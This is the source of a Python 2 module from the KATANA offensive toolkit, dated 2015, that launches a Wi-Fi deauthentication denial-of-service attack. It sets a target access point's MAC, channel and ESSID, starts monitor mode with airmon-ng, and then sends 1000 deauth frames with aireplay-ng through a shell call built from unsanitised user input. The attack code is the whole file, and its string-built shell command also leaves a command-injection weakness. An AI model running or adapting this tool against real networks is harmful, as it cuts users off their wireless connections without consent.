# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# @KATANA                    #
# Modules   : Wifi DOS       #
# Script by : RedToor        #
# Date      : 11/06/2015     #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Katana Core                #
from core.design import *    #
from core.Setting import *   #
from core import Errors      #
from core import help        #
from core import ping        #
import sys                   #
d=DESIGN()                   #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Libraries                  #
import subprocess            #
import commands              #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Default                    #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
defaultcar=INTERFACE_DEVICE
defaultint=INTERFACE_MONITOR
defaultmac=MAC_TARGET
defaultcha=CHANNEL_TARGET
defaultess=ESSID_TARGET
# :-:-:-:-:-:-:-:-:-:-:-:-:- #

def run(card,monitor,mac,channel,essid):
	global defaultcar,defaultint,defaultmac,defaultcha,defaultess
	defaultcar=card
	defaultint=monitor
	defaultmac=mac
	defaultcha=channel
	defaultess=essid
	ddos(1)


def ddos(run):
	global defaultcar,defaultint,defaultmac,defaultcha,defaultess
	try:
		if run!=1:
			actions=raw_input(d.prompt("wifi/dos"))
		else:
			actions="run"
		if actions == "show options" or actions == "sop":
			d.option()
			d.descrip("intf","yes","Interface card",defaultcar)
			d.descrip("intm","yes","Int... monitor",defaultint)
			d.descrip("bssid","yes","Mac address",defaultmac)
			d.descrip("essid","yes","Name of AP",defaultess)
			d.descrip("chan","yes","Channel red",defaultcha)
			d.helpAUX()
			ping.interfaces(1)
			ping.monitor()
			d.space()
		elif actions[0:8] == "set intf":
			defaultcar=ping.update(defaultcar,actions,"intf")
			d.change("intf",defaultcar)
		elif actions[0:8] == "set intm":
			defaultint=ping.update(defaultint,actions,"intm")
			d.change("intm",defaultint)
		elif actions[0:9] == "set bssid":
			defaultmac=ping.update(defaultmac,actions,"bssid")
			d.change("bssid",defaultmac)
		elif actions[0:9] == "set essid":
			defaultess=ping.update(defaultess,actions,"essid")
			d.change("essid",defaultess)
		elif actions[0:8] == "set chan":
			defaultcha=ping.update(defaultcha,actions,"chan")
			d.change("chan",defaultcha)
		elif actions[0:5] == "start":
			start = actions[6:]
			print " "+Alr+" Starting Monitor Mode In "+start,ping.status_cmd("airmon-ng start "+start,"\t\t\t")
		elif actions=="exit" or actions=="x":
			d.goodbye()
			exit()
		elif actions=="help" or actions=="h":
			help.help()
		elif actions=="back" or actions=="b":
			return
		elif actions=="run"  or actions=="r":
			d.run()
			try:
				print " "+Alr+" Starting attack..."
				subprocess.call('aireplay-ng --deauth 1000 -a '+defaultmac+' '+defaultint, shell=True)
			except(KeyboardInterrupt, SystemExit):
				print("\n "+Alr+" Stopped DDOS")
		else:
			d.nocommand()
	except:
		d.kbi()
		exit()
	ddos(0)
